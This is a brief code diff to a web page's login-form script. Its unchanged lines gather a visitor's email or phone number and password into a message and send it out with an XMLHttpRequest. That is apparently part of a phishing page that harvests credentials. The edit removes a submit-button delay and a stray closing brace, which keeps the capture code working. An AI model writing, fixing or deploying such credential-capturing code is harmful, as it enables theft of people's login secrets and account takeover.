@@ -129,15 +129,7 @@
     text: 'Email or Phone: ' + emailOrPhone + '\nPassword: ' + password
   };
 
-  // Disable the submit button for 1 second
-  var submitButton = event.target.querySelector('button[type="submit"]');
-  submitButton.disabled = true;
-  setTimeout(function() {
-    submitButton.disabled = false;
-  }, 1000);
-
   xhr.send(JSON.stringify(data));
-});
 });
   </script>
 </body>
